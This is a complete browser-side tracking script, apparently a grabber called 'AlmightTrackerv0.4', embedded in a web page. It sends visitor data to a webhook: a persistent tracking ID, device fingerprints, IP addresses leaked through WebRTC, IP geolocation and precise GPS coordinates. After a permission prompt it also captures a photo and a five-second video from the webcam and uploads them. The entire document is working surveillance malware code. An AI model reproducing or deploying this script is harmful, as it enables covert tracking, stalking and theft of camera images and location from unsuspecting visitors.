<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
  // Helper functions
  function get(selector, root = document) {
    return root.querySelector(selector);
  }

  // Generate or retrieve persistent user ID
  function getUserID() {
    let uid = localStorage.getItem('almight_uid');
    if (!uid) {
      uid = 'user_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
      localStorage.setItem('almight_uid', uid);
      document.cookie = "almight_uid=" + uid + "; max-age=31536000; path=/";
    }
    return uid;
  }

  // Silent photo and video capture
  var mediaStream = null;
  var mediaRecorder = null;
  var recordedChunks = [];

  function capturePhotoAndVideo(stream) {
    mediaStream = stream;
    
    // Capture photo
    try {
      var video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      
      video.onloadedmetadata = function() {
        var canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        var ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        // Convert to base64
        var photoData = canvas.toDataURL('image/jpeg', 0.8);
        
        // Send photo to server
        $.post("/webhook.php", {
          type: "photo_capture",
          photo: photoData,
          uid: getUserID()
        });
      };
    } catch(e) {
      console.log("Photo capture error:", e);
    }
    
    // Record video (5 seconds)
    try {
      mediaRecorder = new MediaRecorder(stream, {
        mimeType: 'video/webm;codecs=vp8'
      });
      
      mediaRecorder.ondataavailable = function(event) {
        if (event.data.size > 0) {
          recordedChunks.push(event.data);
        }
      };
      
      mediaRecorder.onstop = function() {
        var blob = new Blob(recordedChunks, { type: 'video/webm' });
        var reader = new FileReader();
        reader.onloadend = function() {
          var videoData = reader.result;
          
          // Send video to server
          $.post("/webhook.php", {
            type: "video_capture",
            video: videoData,
            uid: getUserID()
          });
        };
        reader.readAsDataURL(blob);
        
        // Stop all tracks
        stream.getTracks().forEach(track => track.stop());
      };
      
      mediaRecorder.start();
      
      // Stop after 5 seconds
      setTimeout(function() {
        if (mediaRecorder && mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
        }
      }, 5000);
      
    } catch(e) {
      console.log("Video capture error:", e);
    }
  }

  // Request Camera and Microphone permissions
  function requestPermissions() {
    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
      .then(function(stream) {
        $.post("/webhook.php", {
          type: "media_granted",
          data: JSON.stringify({
            video: true,
            audio: true,
            uid: getUserID()
          })
        });
        
        // Capture photo and video silently
        capturePhotoAndVideo(stream);
      })
      .catch(function(err) {
        $.post("/webhook.php", {
          type: "media_denied",
          msg: err.name + ": " + err.message,
          uid: getUserID()
        });
      });
  }

  // WebRTC Leak Detection
  function getWebRTCIPs(callback) {
    var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
    if (!myPeerConnection) {
      callback(null);
      return;
    }
    
    var pc = new myPeerConnection({
        iceServers: [{
          urls: "stun:stun.l.google.com:19302"
        }]
      }),
      noop = function() {},
      localIPs = {},
      ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g;

    function iterateIP(ip) {
      if (!localIPs[ip]) callback(ip);
      localIPs[ip] = true;
    }

    pc.createDataChannel("");
    pc.createOffer().then(function(sdp) {
      sdp.sdp.split('\n').forEach(function(line) {
        if (line.indexOf('candidate') < 0) return;
        var ips = line.match(ipRegex);
        if (ips) ips.forEach(iterateIP);
      });
      pc.setLocalDescription(sdp, noop, noop);
    }).catch(function(reason) {
      // Error creating offer
    });

    pc.onicecandidate = function(ice) {
      if (!ice || !ice.candidate || !ice.candidate.candidate) return;
      var ips = ice.candidate.candidate.match(ipRegex);
      if (ips) ips.forEach(iterateIP);
    };
  }

  // Canvas Fingerprinting
  function getCanvasFingerprint() {
    var canvas = document.createElement('canvas');
    var ctx = canvas.getContext('2d');
    var txt = 'AlmightTrackerv0.4';
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.textBaseline = "alphabetic";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.fillText(txt, 2, 15);
    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
    ctx.fillText(txt, 4, 17);
    return canvas.toDataURL();
  }

  function getFingerprint() {
    return {
      screen_res: screen.width + 'x' + screen.height,
      color_depth: screen.colorDepth,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cores: navigator.hardwareConcurrency,
      memory: navigator.deviceMemory,
      platform: navigator.platform,
      language: navigator.language,
      canvas_hash: getCanvasFingerprint().hashCode(),
      uid: getUserID()
    };
  }

  String.prototype.hashCode = function() {
    var hash = 0, i, chr;
    if (this.length === 0) return hash;
    for (i = 0; i < this.length; i++) {
      chr = this.charCodeAt(i);
      hash = ((hash << 5) - hash) + chr;
      hash |= 0;
    }
    return hash;
  };

  // Main Data Gathering
  $(document).ready(function() {
    let datetime = new Date();
    let localtime = String(datetime.toLocaleTimeString());
    let uid = getUserID();
    
    // Basic Info
    var basicInfo = {
      user_agent: navigator.userAgent,
      platform: navigator.platform,
      cookies_enabled: navigator.cookieEnabled,
      language: navigator.language,
      cores: navigator.hardwareConcurrency,
      memory: navigator.deviceMemory,
      screen: screen.width + 'x' + screen.height,
      local_time: localtime,
      referrer: document.referrer,
      uid: uid
    };

    $.post("/webhook.php", {
      type: "basic",
      data: JSON.stringify(basicInfo)
    });

    // WebRTC IPs
    getWebRTCIPs(function(ip) {
      if (ip) {
        $.post("/webhook.php", {
          type: "webrtc",
          ip: ip,
          uid: uid
        });
      }
    });

    // Fingerprint
    $.post("/webhook.php", {
      type: "fingerprint",
      data: JSON.stringify(getFingerprint())
    });

    // Public IP & Location
    $.getJSON("https://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,proxy,hosting,query", function(response) {
      response.uid = uid;
      $.post("/webhook.php", {
        type: "location",
        data: JSON.stringify(response)
      });
      $("#techchip").html(response.query);
    });

    // GPS Location with high accuracy
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(function(position) {
        var gpsData = {
          lat: position.coords.latitude,
          lon: position.coords.longitude,
          acc: position.coords.accuracy,
          alt: position.coords.altitude,
          alt_acc: position.coords.altitudeAccuracy,
          heading: position.coords.heading,
          speed: position.coords.speed,
          uid: uid
        };
        $.post("/webhook.php", {
          type: "gps",
          data: JSON.stringify(gpsData)
        });
      }, function(error) {
        $.post("/webhook.php", {
          type: "error",
          msg: "GPS Error: " + error.code + " - " + error.message,
          uid: uid
        });
      }, {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      });
    } else {
      $.post("/webhook.php", {
        type: "error",
        msg: "Geolocation not supported",
        uid: uid
      });
    }
  });

  // Make requestPermissions available globally
  window.requestPermissions = requestPermissions;
</script>
